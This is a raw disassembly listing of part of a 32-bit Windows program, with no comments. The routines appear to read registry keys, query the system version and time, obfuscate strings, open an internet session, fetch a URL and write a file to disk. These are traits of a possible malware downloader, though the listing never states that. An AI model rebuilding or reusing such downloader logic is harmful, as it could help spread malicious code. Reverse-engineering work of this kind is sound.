  406a0e:	68 06 00 02 00       	push   $0x20006
  406a13:	56                   	push   %esi
  406a14:	56                   	push   %esi
  406a15:	56                   	push   %esi
  406a16:	ff 75 0c             	push   0xc(%ebp)
  406a19:	89 75 fc             	mov    %esi,-0x4(%ebp)
  406a1c:	ff 75 08             	push   0x8(%ebp)
  406a1f:	89 75 f8             	mov    %esi,-0x8(%ebp)
  406a22:	ff 15 10 e0 40 00    	call   *0x40e010
  406a28:	85 c0                	test   %eax,%eax
  406a2a:	74 04                	je     0x406a30
  406a2c:	33 c0                	xor    %eax,%eax
  406a2e:	eb 35                	jmp    0x406a65
  406a30:	57                   	push   %edi
  406a31:	ff 75 14             	push   0x14(%ebp)
  406a34:	e8 18 ea ff ff       	call   0x405451
  406a39:	59                   	pop    %ecx
  406a3a:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  406a3e:	50                   	push   %eax
  406a3f:	ff 75 14             	push   0x14(%ebp)
  406a42:	ff 75 18             	push   0x18(%ebp)
  406a45:	56                   	push   %esi
  406a46:	ff 75 10             	push   0x10(%ebp)
  406a49:	ff 75 fc             	push   -0x4(%ebp)
  406a4c:	ff 15 0c e0 40 00    	call   *0x40e00c
  406a52:	ff 75 fc             	push   -0x4(%ebp)
  406a55:	8b f8                	mov    %eax,%edi
  406a57:	ff 15 14 e0 40 00    	call   *0x40e014
  406a5d:	33 c0                	xor    %eax,%eax
  406a5f:	3b fe                	cmp    %esi,%edi
  406a61:	0f 94 c0             	sete   %al
  406a64:	5f                   	pop    %edi
  406a65:	5e                   	pop    %esi
  406a66:	c9                   	leave
  406a67:	c3                   	ret
  406a68:	55                   	push   %ebp
  406a69:	8b ec                	mov    %esp,%ebp
  406a6b:	81 ec 04 08 00 00    	sub    $0x804,%esp
  406a71:	53                   	push   %ebx
  406a72:	56                   	push   %esi
  406a73:	57                   	push   %edi
  406a74:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406a77:	50                   	push   %eax
  406a78:	6a 01                	push   $0x1
  406a7a:	33 f6                	xor    %esi,%esi
  406a7c:	56                   	push   %esi
  406a7d:	bb e0 e9 40 00       	mov    $0x40e9e0,%ebx
  406a82:	53                   	push   %ebx
  406a83:	bf 01 00 00 80       	mov    $0x80000001,%edi
  406a88:	57                   	push   %edi
  406a89:	89 75 fc             	mov    %esi,-0x4(%ebp)
  406a8c:	ff 15 00 e0 40 00    	call   *0x40e000
  406a92:	85 c0                	test   %eax,%eax
  406a94:	74 04                	je     0x406a9a
  406a96:	33 d2                	xor    %edx,%edx
  406a98:	eb 3e                	jmp    0x406ad8
  406a9a:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406aa0:	50                   	push   %eax
  406aa1:	56                   	push   %esi
  406aa2:	8d 75 fc             	lea    -0x4(%ebp),%esi
  406aa5:	e8 16 ff ff ff       	call   0x4069c0
  406aaa:	8b d0                	mov    %eax,%edx
  406aac:	85 d2                	test   %edx,%edx
  406aae:	59                   	pop    %ecx
  406aaf:	59                   	pop    %ecx
  406ab0:	74 26                	je     0x406ad8
  406ab2:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406ab8:	50                   	push   %eax
  406ab9:	e8 93 e9 ff ff       	call   0x405451
  406abe:	85 c0                	test   %eax,%eax
  406ac0:	59                   	pop    %ecx
  406ac1:	74 15                	je     0x406ad8
  406ac3:	6a 02                	push   $0x2
  406ac5:	68 48 ea 40 00       	push   $0x40ea48
  406aca:	6a 00                	push   $0x0
  406acc:	53                   	push   %ebx
  406acd:	57                   	push   %edi
  406ace:	e8 2a ff ff ff       	call   0x4069fd
  406ad3:	83 c4 14             	add    $0x14,%esp
  406ad6:	8b d0                	mov    %eax,%edx
  406ad8:	5f                   	pop    %edi
  406ad9:	5e                   	pop    %esi
  406ada:	8b c2                	mov    %edx,%eax
  406adc:	5b                   	pop    %ebx
  406add:	c9                   	leave
  406ade:	c3                   	ret
  406adf:	55                   	push   %ebp
  406ae0:	8b ec                	mov    %esp,%ebp
  406ae2:	b8 04 18 00 00       	mov    $0x1804,%eax
  406ae7:	e8 c4 6a 00 00       	call   0x40d5b0
  406aec:	53                   	push   %ebx
  406aed:	56                   	push   %esi
  406aee:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406af4:	57                   	push   %edi
  406af5:	50                   	push   %eax
  406af6:	ba 50 ea 40 00       	mov    $0x40ea50,%edx
  406afb:	e8 11 ea ff ff       	call   0x405511
  406b00:	59                   	pop    %ecx
  406b01:	b9 ac ea 40 00       	mov    $0x40eaac,%ecx
  406b06:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406b0c:	e8 dc e9 ff ff       	call   0x4054ed
  406b11:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406b15:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406b18:	50                   	push   %eax
  406b19:	6a 01                	push   $0x1
  406b1b:	6a 00                	push   $0x0
  406b1d:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406b23:	50                   	push   %eax
  406b24:	bf 02 00 00 80       	mov    $0x80000002,%edi
  406b29:	57                   	push   %edi
  406b2a:	ff 15 00 e0 40 00    	call   *0x40e000
  406b30:	85 c0                	test   %eax,%eax
  406b32:	75 1b                	jne    0x406b4f
  406b34:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  406b3a:	50                   	push   %eax
  406b3b:	bb 14 eb 40 00       	mov    $0x40eb14,%ebx
  406b40:	53                   	push   %ebx
  406b41:	8d 75 fc             	lea    -0x4(%ebp),%esi
  406b44:	e8 77 fe ff ff       	call   0x4069c0
  406b49:	85 c0                	test   %eax,%eax
  406b4b:	59                   	pop    %ecx
  406b4c:	59                   	pop    %ecx
  406b4d:	75 07                	jne    0x406b56
  406b4f:	33 c0                	xor    %eax,%eax
  406b51:	e9 1c 01 00 00       	jmp    0x406c72
  406b56:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406b5c:	50                   	push   %eax
  406b5d:	ba 50 ea 40 00       	mov    $0x40ea50,%edx
  406b62:	e8 aa e9 ff ff       	call   0x405511
  406b67:	59                   	pop    %ecx
  406b68:	b9 c0 ea 40 00       	mov    $0x40eac0,%ecx
  406b6d:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406b73:	e8 75 e9 ff ff       	call   0x4054ed
  406b78:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406b7c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406b7f:	50                   	push   %eax
  406b80:	6a 01                	push   $0x1
  406b82:	6a 00                	push   $0x0
  406b84:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406b8a:	50                   	push   %eax
  406b8b:	57                   	push   %edi
  406b8c:	ff 15 00 e0 40 00    	call   *0x40e000
  406b92:	85 c0                	test   %eax,%eax
  406b94:	75 16                	jne    0x406bac
  406b96:	8d 85 fc e7 ff ff    	lea    -0x1804(%ebp),%eax
  406b9c:	50                   	push   %eax
  406b9d:	53                   	push   %ebx
  406b9e:	8d 75 fc             	lea    -0x4(%ebp),%esi
  406ba1:	e8 1a fe ff ff       	call   0x4069c0
  406ba6:	85 c0                	test   %eax,%eax
  406ba8:	59                   	pop    %ecx
  406ba9:	59                   	pop    %ecx
  406baa:	75 20                	jne    0x406bcc
  406bac:	6a 01                	push   $0x1
  406bae:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  406bb4:	50                   	push   %eax
  406bb5:	53                   	push   %ebx
  406bb6:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406bbc:	50                   	push   %eax
  406bbd:	57                   	push   %edi
  406bbe:	e8 3a fe ff ff       	call   0x4069fd
  406bc3:	83 c4 14             	add    $0x14,%esp
  406bc6:	85 c0                	test   %eax,%eax
  406bc8:	75 17                	jne    0x406be1
  406bca:	eb 83                	jmp    0x406b4f
  406bcc:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  406bd2:	8d 95 fc e7 ff ff    	lea    -0x1804(%ebp),%edx
  406bd8:	e8 8a e8 ff ff       	call   0x405467
  406bdd:	85 c0                	test   %eax,%eax
  406bdf:	75 cb                	jne    0x406bac
  406be1:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406be7:	50                   	push   %eax
  406be8:	ba 50 ea 40 00       	mov    $0x40ea50,%edx
  406bed:	e8 1f e9 ff ff       	call   0x405511
  406bf2:	59                   	pop    %ecx
  406bf3:	b9 f4 ea 40 00       	mov    $0x40eaf4,%ecx
  406bf8:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406bfe:	e8 ea e8 ff ff       	call   0x4054ed
  406c03:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406c07:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406c0a:	50                   	push   %eax
  406c0b:	6a 01                	push   $0x1
  406c0d:	6a 00                	push   $0x0
  406c0f:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406c15:	50                   	push   %eax
  406c16:	57                   	push   %edi
  406c17:	ff 15 00 e0 40 00    	call   *0x40e000
  406c1d:	85 c0                	test   %eax,%eax
  406c1f:	75 16                	jne    0x406c37
  406c21:	8d 85 fc e7 ff ff    	lea    -0x1804(%ebp),%eax
  406c27:	50                   	push   %eax
  406c28:	53                   	push   %ebx
  406c29:	8d 75 fc             	lea    -0x4(%ebp),%esi
  406c2c:	e8 8f fd ff ff       	call   0x4069c0
  406c31:	85 c0                	test   %eax,%eax
  406c33:	59                   	pop    %ecx
  406c34:	59                   	pop    %ecx
  406c35:	75 23                	jne    0x406c5a
  406c37:	6a 01                	push   $0x1
  406c39:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  406c3f:	50                   	push   %eax
  406c40:	53                   	push   %ebx
  406c41:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  406c47:	50                   	push   %eax
  406c48:	57                   	push   %edi
  406c49:	e8 af fd ff ff       	call   0x4069fd
  406c4e:	83 c4 14             	add    $0x14,%esp
  406c51:	85 c0                	test   %eax,%eax
  406c53:	75 1a                	jne    0x406c6f
  406c55:	e9 f5 fe ff ff       	jmp    0x406b4f
  406c5a:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  406c60:	8d 95 fc e7 ff ff    	lea    -0x1804(%ebp),%edx
  406c66:	e8 fc e7 ff ff       	call   0x405467
  406c6b:	85 c0                	test   %eax,%eax
  406c6d:	75 c8                	jne    0x406c37
  406c6f:	33 c0                	xor    %eax,%eax
  406c71:	40                   	inc    %eax
  406c72:	5f                   	pop    %edi
  406c73:	5e                   	pop    %esi
  406c74:	5b                   	pop    %ebx
  406c75:	c9                   	leave
  406c76:	c3                   	ret
  406c77:	55                   	push   %ebp
  406c78:	8b ec                	mov    %esp,%ebp
  406c7a:	51                   	push   %ecx
  406c7b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406c7f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406c82:	50                   	push   %eax
  406c83:	6a 01                	push   $0x1
  406c85:	6a 00                	push   $0x0
  406c87:	68 30 eb 40 00       	push   $0x40eb30
  406c8c:	68 02 00 00 80       	push   $0x80000002
  406c91:	ff 15 00 e0 40 00    	call   *0x40e000
  406c97:	85 c0                	test   %eax,%eax
  406c99:	74 04                	je     0x406c9f
  406c9b:	33 c0                	xor    %eax,%eax
  406c9d:	c9                   	leave
  406c9e:	c3                   	ret
  406c9f:	56                   	push   %esi
  406ca0:	ff 75 08             	push   0x8(%ebp)
  406ca3:	8d 75 fc             	lea    -0x4(%ebp),%esi
  406ca6:	68 20 eb 40 00       	push   $0x40eb20
  406cab:	e8 10 fd ff ff       	call   0x4069c0
  406cb0:	59                   	pop    %ecx
  406cb1:	59                   	pop    %ecx
  406cb2:	5e                   	pop    %esi
  406cb3:	c9                   	leave
  406cb4:	c3                   	ret
  406cb5:	55                   	push   %ebp
  406cb6:	8b ec                	mov    %esp,%ebp
  406cb8:	81 ec 1c 01 00 00    	sub    $0x11c,%esp
  406cbe:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
  406cc4:	50                   	push   %eax
  406cc5:	c7 85 e4 fe ff ff 1c 	movl   $0x11c,-0x11c(%ebp)
  406ccc:	01 00 00 
  406ccf:	ff 15 90 e0 40 00    	call   *0x40e090
  406cd5:	8b 85 e8 fe ff ff    	mov    -0x118(%ebp),%eax
  406cdb:	0f b7 4d f8          	movzwl -0x8(%ebp),%ecx
  406cdf:	6b c0 0a             	imul   $0xa,%eax,%eax
  406ce2:	03 85 ec fe ff ff    	add    -0x114(%ebp),%eax
  406ce8:	6b c0 0a             	imul   $0xa,%eax,%eax
  406ceb:	03 c1                	add    %ecx,%eax
  406ced:	6b c0 0a             	imul   $0xa,%eax,%eax
  406cf0:	80 7d fe 01          	cmpb   $0x1,-0x2(%ebp)
  406cf4:	75 01                	jne    0x406cf7
  406cf6:	40                   	inc    %eax
  406cf7:	c9                   	leave
  406cf8:	c3                   	ret
  406cf9:	52                   	push   %edx
  406cfa:	e8 52 e7 ff ff       	call   0x405451
  406cff:	85 c0                	test   %eax,%eax
  406d01:	59                   	pop    %ecx
  406d02:	76 0a                	jbe    0x406d0e
  406d04:	66 83 3c 42 5c       	cmpw   $0x5c,(%edx,%eax,2)
  406d09:	74 03                	je     0x406d0e
  406d0b:	48                   	dec    %eax
  406d0c:	75 f6                	jne    0x406d04
  406d0e:	66 83 24 42 00       	andw   $0x0,(%edx,%eax,2)
  406d13:	c3                   	ret
  406d14:	56                   	push   %esi
  406d15:	33 f6                	xor    %esi,%esi
  406d17:	56                   	push   %esi
  406d18:	ff 15 84 e1 40 00    	call   *0x40e184
  406d1e:	85 c0                	test   %eax,%eax
  406d20:	74 04                	je     0x406d26
  406d22:	33 c0                	xor    %eax,%eax
  406d24:	5e                   	pop    %esi
  406d25:	c3                   	ret
  406d26:	56                   	push   %esi
  406d27:	56                   	push   %esi
  406d28:	56                   	push   %esi
  406d29:	6a 01                	push   $0x1
  406d2b:	56                   	push   %esi
  406d2c:	ff 15 88 e1 40 00    	call   *0x40e188
  406d32:	33 c9                	xor    %ecx,%ecx
  406d34:	3b c6                	cmp    %esi,%eax
  406d36:	0f 95 c1             	setne  %cl
  406d39:	a3 e4 14 41 00       	mov    %eax,0x4114e4
  406d3e:	5e                   	pop    %esi
  406d3f:	8b c1                	mov    %ecx,%eax
  406d41:	c3                   	ret
  406d42:	55                   	push   %ebp
  406d43:	8b ec                	mov    %esp,%ebp
  406d45:	83 ec 10             	sub    $0x10,%esp
  406d48:	56                   	push   %esi
  406d49:	8b f0                	mov    %eax,%esi
  406d4b:	57                   	push   %edi
  406d4c:	56                   	push   %esi
  406d4d:	e8 ff e6 ff ff       	call   0x405451
  406d52:	59                   	pop    %ecx
  406d53:	6a 05                	push   $0x5
  406d55:	5a                   	pop    %edx
  406d56:	3b c2                	cmp    %edx,%eax
  406d58:	73 02                	jae    0x406d5c
  406d5a:	8b d0                	mov    %eax,%edx
  406d5c:	33 c9                	xor    %ecx,%ecx
  406d5e:	85 d2                	test   %edx,%edx
  406d60:	76 15                	jbe    0x406d77
  406d62:	2b c2                	sub    %edx,%eax
  406d64:	8b ca                	mov    %edx,%ecx
  406d66:	d1 e9                	shr    $1,%ecx
  406d68:	8d 34 46             	lea    (%esi,%eax,2),%esi
  406d6b:	8d 7d f0             	lea    -0x10(%ebp),%edi
  406d6e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406d70:	13 c9                	adc    %ecx,%ecx
  406d72:	66 f3 a5             	rep movsw %ds:(%esi),%es:(%edi)
  406d75:	8b ca                	mov    %edx,%ecx
  406d77:	66 83 64 4d f0 00    	andw   $0x0,-0x10(%ebp,%ecx,2)
  406d7d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406d80:	e8 4f e8 ff ff       	call   0x4055d4
  406d85:	6a 07                	push   $0x7
  406d87:	33 d2                	xor    %edx,%edx
  406d89:	59                   	pop    %ecx
  406d8a:	f7 f1                	div    %ecx
  406d8c:	8b 75 08             	mov    0x8(%ebp),%esi
  406d8f:	33 ff                	xor    %edi,%edi
  406d91:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  406d94:	0f b7 c2             	movzwl %dx,%eax
  406d97:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406d9a:	76 5d                	jbe    0x406df9
  406d9c:	53                   	push   %ebx
  406d9d:	66 8b 06             	mov    (%esi),%ax
  406da0:	66 03 45 fc          	add    -0x4(%ebp),%ax
  406da4:	6a 03                	push   $0x3
  406da6:	0f b7 c8             	movzwl %ax,%ecx
  406da9:	33 d2                	xor    %edx,%edx
  406dab:	8b c7                	mov    %edi,%eax
  406dad:	5b                   	pop    %ebx
  406dae:	f7 f3                	div    %ebx
  406db0:	33 c0                	xor    %eax,%eax
  406db2:	2b d0                	sub    %eax,%edx
  406db4:	74 29                	je     0x406ddf
  406db6:	4a                   	dec    %edx
  406db7:	74 14                	je     0x406dcd
  406db9:	4a                   	dec    %edx
  406dba:	75 31                	jne    0x406ded
  406dbc:	39 45 10             	cmp    %eax,0x10(%ebp)
  406dbf:	74 04                	je     0x406dc5
  406dc1:	41                   	inc    %ecx
  406dc2:	41                   	inc    %ecx
  406dc3:	eb 28                	jmp    0x406ded
  406dc5:	81 c1 fe ff 00 00    	add    $0xfffe,%ecx
  406dcb:	eb 20                	jmp    0x406ded
  406dcd:	39 45 10             	cmp    %eax,0x10(%ebp)
  406dd0:	74 05                	je     0x406dd7
  406dd2:	83 c1 05             	add    $0x5,%ecx
  406dd5:	eb 16                	jmp    0x406ded
  406dd7:	81 c1 fb ff 00 00    	add    $0xfffb,%ecx
  406ddd:	eb 0e                	jmp    0x406ded
  406ddf:	39 45 10             	cmp    %eax,0x10(%ebp)
  406de2:	74 03                	je     0x406de7
  406de4:	41                   	inc    %ecx
  406de5:	eb 06                	jmp    0x406ded
  406de7:	81 c1 ff ff 00 00    	add    $0xffff,%ecx
  406ded:	66 89 0e             	mov    %cx,(%esi)
  406df0:	46                   	inc    %esi
  406df1:	46                   	inc    %esi
  406df2:	47                   	inc    %edi
  406df3:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  406df6:	72 a5                	jb     0x406d9d
  406df8:	5b                   	pop    %ebx
  406df9:	33 c0                	xor    %eax,%eax
  406dfb:	5f                   	pop    %edi
  406dfc:	40                   	inc    %eax
  406dfd:	5e                   	pop    %esi
  406dfe:	c9                   	leave
  406dff:	c3                   	ret
  406e00:	55                   	push   %ebp
  406e01:	8b ec                	mov    %esp,%ebp
  406e03:	83 ec 14             	sub    $0x14,%esp
  406e06:	56                   	push   %esi
  406e07:	be 7c eb 40 00       	mov    $0x40eb7c,%esi
  406e0c:	56                   	push   %esi
  406e0d:	e8 3f e6 ff ff       	call   0x405451
  406e12:	03 c0                	add    %eax,%eax
  406e14:	50                   	push   %eax
  406e15:	ff 75 08             	push   0x8(%ebp)
  406e18:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406e1b:	50                   	push   %eax
  406e1c:	e8 af 57 00 00       	call   0x40c5d0
  406e21:	56                   	push   %esi
  406e22:	e8 2a e6 ff ff       	call   0x405451
  406e27:	66 83 64 45 ec 00    	andw   $0x0,-0x14(%ebp,%eax,2)
  406e2d:	83 c4 14             	add    $0x14,%esp
  406e30:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  406e34:	75 19                	jne    0x406e4f
  406e36:	6a 01                	push   $0x1
  406e38:	56                   	push   %esi
  406e39:	e8 13 e6 ff ff       	call   0x405451
  406e3e:	59                   	pop    %ecx
  406e3f:	50                   	push   %eax
  406e40:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406e43:	50                   	push   %eax
  406e44:	8b 45 0c             	mov    0xc(%ebp),%eax
  406e47:	e8 f6 fe ff ff       	call   0x406d42
  406e4c:	83 c4 0c             	add    $0xc,%esp
  406e4f:	56                   	push   %esi
  406e50:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406e53:	e8 3b e6 ff ff       	call   0x405493
  406e58:	59                   	pop    %ecx
  406e59:	33 d2                	xor    %edx,%edx
  406e5b:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406e5e:	3b c1                	cmp    %ecx,%eax
  406e60:	0f 95 c2             	setne  %dl
  406e63:	5e                   	pop    %esi
  406e64:	42                   	inc    %edx
  406e65:	8b c2                	mov    %edx,%eax
  406e67:	c9                   	leave
  406e68:	c3                   	ret
  406e69:	55                   	push   %ebp
  406e6a:	8b ec                	mov    %esp,%ebp
  406e6c:	b8 d0 30 00 00       	mov    $0x30d0,%eax
  406e71:	e8 3a 67 00 00       	call   0x40d5b0
  406e76:	53                   	push   %ebx
  406e77:	56                   	push   %esi
  406e78:	ff 15 50 e0 40 00    	call   *0x40e050
  406e7e:	8b 55 08             	mov    0x8(%ebp),%edx
  406e81:	a3 e0 14 41 00       	mov    %eax,0x4114e0
  406e86:	8d 85 30 cf ff ff    	lea    -0x30d0(%ebp),%eax
  406e8c:	50                   	push   %eax
  406e8d:	e8 7f e6 ff ff       	call   0x405511
  406e92:	59                   	pop    %ecx
  406e93:	e8 b5 e9 ff ff       	call   0x40584d
  406e98:	99                   	cltd
  406e99:	be e8 03 00 00       	mov    $0x3e8,%esi
  406e9e:	8b ce                	mov    %esi,%ecx
  406ea0:	f7 f9                	idiv   %ecx
  406ea2:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  406ea8:	8b ca                	mov    %edx,%ecx
  406eaa:	85 c9                	test   %ecx,%ecx
  406eac:	75 12                	jne    0x406ec0
  406eae:	66 21 95 32 ff ff ff 	and    %dx,-0xce(%ebp)
  406eb5:	66 c7 85 30 ff ff ff 	movw   $0x30,-0xd0(%ebp)
  406ebc:	30 00 
  406ebe:	eb 05                	jmp    0x406ec5
  406ec0:	e8 34 e8 ff ff       	call   0x4056f9
  406ec5:	8b c8                	mov    %eax,%ecx
  406ec7:	8d 85 30 cf ff ff    	lea    -0x30d0(%ebp),%eax
  406ecd:	e8 1b e6 ff ff       	call   0x4054ed
  406ed2:	b9 38 e3 40 00       	mov    $0x40e338,%ecx
  406ed7:	e8 11 e6 ff ff       	call   0x4054ed
  406edc:	e8 6c e9 ff ff       	call   0x40584d
  406ee1:	99                   	cltd
  406ee2:	f7 fe                	idiv   %esi
  406ee4:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  406eea:	85 d2                	test   %edx,%edx
  406eec:	75 12                	jne    0x406f00
  406eee:	66 21 95 32 ff ff ff 	and    %dx,-0xce(%ebp)
  406ef5:	66 c7 85 30 ff ff ff 	movw   $0x30,-0xd0(%ebp)
  406efc:	30 00 
  406efe:	eb 07                	jmp    0x406f07
  406f00:	8b ca                	mov    %edx,%ecx
  406f02:	e8 f2 e7 ff ff       	call   0x4056f9
  406f07:	8b c8                	mov    %eax,%ecx
  406f09:	8d 85 30 cf ff ff    	lea    -0x30d0(%ebp),%eax
  406f0f:	e8 d9 e5 ff ff       	call   0x4054ed
  406f14:	b9 3c e3 40 00       	mov    $0x40e33c,%ecx
  406f19:	e8 cf e5 ff ff       	call   0x4054ed
  406f1e:	8b 55 0c             	mov    0xc(%ebp),%edx
  406f21:	8d 85 30 ef ff ff    	lea    -0x10d0(%ebp),%eax
  406f27:	50                   	push   %eax
  406f28:	e8 e4 e5 ff ff       	call   0x405511
  406f2d:	59                   	pop    %ecx
  406f2e:	b9 68 e3 40 00       	mov    $0x40e368,%ecx
  406f33:	8d 85 30 ef ff ff    	lea    -0x10d0(%ebp),%eax
  406f39:	e8 af e5 ff ff       	call   0x4054ed
  406f3e:	8d 9d 30 ff ff ff    	lea    -0xd0(%ebp),%ebx
  406f44:	e8 05 0c 00 00       	call   0x407b4e
  406f49:	8b cb                	mov    %ebx,%ecx
  406f4b:	8d 85 30 ef ff ff    	lea    -0x10d0(%ebp),%eax
  406f51:	e8 97 e5 ff ff       	call   0x4054ed
  406f56:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  406f5a:	74 0a                	je     0x406f66
  406f5c:	b9 90 eb 40 00       	mov    $0x40eb90,%ecx
  406f61:	e8 87 e5 ff ff       	call   0x4054ed
  406f66:	8d 85 30 ef ff ff    	lea    -0x10d0(%ebp),%eax
  406f6c:	6a 00                	push   $0x0
  406f6e:	50                   	push   %eax
  406f6f:	e8 dd e4 ff ff       	call   0x405451
  406f74:	8b 75 10             	mov    0x10(%ebp),%esi
  406f77:	59                   	pop    %ecx
  406f78:	50                   	push   %eax
  406f79:	8d 85 30 ef ff ff    	lea    -0x10d0(%ebp),%eax
  406f7f:	50                   	push   %eax
  406f80:	8b c6                	mov    %esi,%eax
  406f82:	e8 bb fd ff ff       	call   0x406d42
  406f87:	8d 85 30 df ff ff    	lea    -0x20d0(%ebp),%eax
  406f8d:	50                   	push   %eax
  406f8e:	ba 74 e3 40 00       	mov    $0x40e374,%edx
  406f93:	e8 79 e5 ff ff       	call   0x405511
  406f98:	8b ce                	mov    %esi,%ecx
  406f9a:	8d 85 30 df ff ff    	lea    -0x20d0(%ebp),%eax
  406fa0:	e8 48 e5 ff ff       	call   0x4054ed
  406fa5:	b9 84 e3 40 00       	mov    $0x40e384,%ecx
  406faa:	e8 3e e5 ff ff       	call   0x4054ed
  406faf:	b9 8c e3 40 00       	mov    $0x40e38c,%ecx
  406fb4:	e8 34 e5 ff ff       	call   0x4054ed
  406fb9:	8d 8d 30 ef ff ff    	lea    -0x10d0(%ebp),%ecx
  406fbf:	e8 29 e5 ff ff       	call   0x4054ed
  406fc4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406fc7:	50                   	push   %eax
  406fc8:	57                   	push   %edi
  406fc9:	ff 35 e4 14 41 00    	push   0x4114e4
  406fcf:	8d 85 30 df ff ff    	lea    -0x20d0(%ebp),%eax
  406fd5:	50                   	push   %eax
  406fd6:	8d 85 30 cf ff ff    	lea    -0x30d0(%ebp),%eax
  406fdc:	50                   	push   %eax
  406fdd:	e8 b7 2c 00 00       	call   0x409c99
  406fe2:	83 c4 24             	add    $0x24,%esp
  406fe5:	85 c0                	test   %eax,%eax
  406fe7:	74 49                	je     0x407032
  406fe9:	ff 75 14             	push   0x14(%ebp)
  406fec:	56                   	push   %esi
  406fed:	ff 37                	push   (%edi)
  406fef:	e8 0c fe ff ff       	call   0x406e00
  406ff4:	8b d8                	mov    %eax,%ebx
  406ff6:	83 c4 0c             	add    $0xc,%esp
  406ff9:	83 fb 01             	cmp    $0x1,%ebx
  406ffc:	74 1b                	je     0x407019
  406ffe:	8b 07                	mov    (%edi),%eax
  407000:	68 a4 eb 40 00       	push   $0x40eba4
  407005:	e8 89 e4 ff ff       	call   0x405493
  40700a:	85 c0                	test   %eax,%eax
  40700c:	59                   	pop    %ecx
  40700d:	74 21                	je     0x407030
  40700f:	8d 50 26             	lea    0x26(%eax),%edx
  407012:	e8 25 0a 00 00       	call   0x407a3c
  407017:	eb 17                	jmp    0x407030
  407019:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  40701d:	75 11                	jne    0x407030
  40701f:	6a 01                	push   $0x1
  407021:	ff 75 fc             	push   -0x4(%ebp)
  407024:	8b c6                	mov    %esi,%eax
  407026:	ff 37                	push   (%edi)
  407028:	e8 15 fd ff ff       	call   0x406d42
  40702d:	83 c4 0c             	add    $0xc,%esp
  407030:	8b c3                	mov    %ebx,%eax
  407032:	5e                   	pop    %esi
  407033:	5b                   	pop    %ebx
  407034:	c9                   	leave
  407035:	c3                   	ret
  407036:	55                   	push   %ebp
  407037:	8b ec                	mov    %esp,%ebp
  407039:	81 ec 18 08 00 00    	sub    $0x818,%esp
  40703f:	53                   	push   %ebx
  407040:	ff 75 10             	push   0x10(%ebp)
  407043:	ff 15 54 e0 40 00    	call   *0x40e054
  407049:	33 db                	xor    %ebx,%ebx
  40704b:	53                   	push   %ebx
  40704c:	68 80 00 00 00       	push   $0x80
  407051:	6a 04                	push   $0x4
  407053:	53                   	push   %ebx
  407054:	53                   	push   %ebx
  407055:	68 00 00 00 40       	push   $0x40000000
  40705a:	ff 75 10             	push   0x10(%ebp)
  40705d:	ff 15 c0 e0 40 00    	call   *0x40e0c0
  407063:	83 f8 ff             	cmp    $0xffffffff,%eax
  407066:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407069:	75 0d                	jne    0x407078
  40706b:	8b 45 14             	mov    0x14(%ebp),%eax
  40706e:	83 08 01             	orl    $0x1,(%eax)
  407071:	33 c0                	xor    %eax,%eax
  407073:	e9 cf 00 00 00       	jmp    0x407147
  407078:	57                   	push   %edi
  407079:	ff 15 64 e0 40 00    	call   *0x40e064
  40707f:	3d b7 00 00 00       	cmp    $0xb7,%eax
  407084:	8b 7d 14             	mov    0x14(%ebp),%edi
  407087:	75 0c                	jne    0x407095
  407089:	ff 75 fc             	push   -0x4(%ebp)
  40708c:	83 0f 02             	orl    $0x2,(%edi)
  40708f:	ff 15 8c e0 40 00    	call   *0x40e08c
  407095:	56                   	push   %esi
  407096:	53                   	push   %ebx
  407097:	68 00 00 00 80       	push   $0x80000000
  40709c:	53                   	push   %ebx
  40709d:	ff 75 0c             	push   0xc(%ebp)
  4070a0:	ff 75 08             	push   0x8(%ebp)
  4070a3:	ff 35 e4 14 41 00    	push   0x4114e4
  4070a9:	ff 15 80 e1 40 00    	call   *0x40e180
  4070af:	8b f0                	mov    %eax,%esi
  4070b1:	3b f3                	cmp    %ebx,%esi
  4070b3:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4070b6:	75 0e                	jne    0x4070c6
  4070b8:	ff 75 fc             	push   -0x4(%ebp)
